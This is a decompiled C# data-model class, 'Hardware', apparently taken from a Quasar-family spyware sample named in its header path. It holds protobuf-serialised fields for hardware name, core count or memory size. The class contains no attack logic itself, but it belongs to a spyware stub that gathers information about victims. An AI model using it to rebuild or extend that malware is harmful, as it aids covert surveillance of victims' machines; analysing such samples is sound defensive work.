// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.Common.Hardware
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using ProtoBuf;
using System.Collections.Generic;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Common
{
  [ProtoContract(Name = "Hardware")]
  public class Hardware : INotifyPropertyChanged, IEqualityComparer<Hardware>
  {
    private string _parameter;
    private string _caption;
    private HardwareType _hardType;

    [ProtoMember(1, Name = "Caption")]
    public string Caption
    {
      get => this._caption;
      set
      {
        this._caption = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Caption)));
      }
    }

    [ProtoMember(2, Name = "Parameter")]
    public string Parameter
    {
      get => this._parameter;
      set
      {
        this._parameter = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Parameter)));
      }
    }

    [ProtoMember(3, Name = "HardType")]
    public HardwareType HardType
    {
      get => this._hardType;
      set
      {
        this._hardType = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (HardType)));
      }
    }

    public event PropertyChangedEventHandler PropertyChanged;

    public override string ToString() => "Name: " + this.Caption + "," + (this.HardType == HardwareType.Processor ? " " + this.Parameter + " Cores" : " " + this.Parameter + " bytes");

    public bool Equals(Hardware x, Hardware y) => x.Caption == y.Caption && x.Parameter == y.Parameter;

    public int GetHashCode(Hardware obj)
    {
      int hashCode = 37 * 397;
      if (!string.IsNullOrEmpty(obj.Caption))
        hashCode += obj.Caption.GetHashCode();
      if (!string.IsNullOrEmpty(obj.Parameter))
        hashCode += obj.Parameter.GetHashCode();
      return hashCode;
    }
  }
}
